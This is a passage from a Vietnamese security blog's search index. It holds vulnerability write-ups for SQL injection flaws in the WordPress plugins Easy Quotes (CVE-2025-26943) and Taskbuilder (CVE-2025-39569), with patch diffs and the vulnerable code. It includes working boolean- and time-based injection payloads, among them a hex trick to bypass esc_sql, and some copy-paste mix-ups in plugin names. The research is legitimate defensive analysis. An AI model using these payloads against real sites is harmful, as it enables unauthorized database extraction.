Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 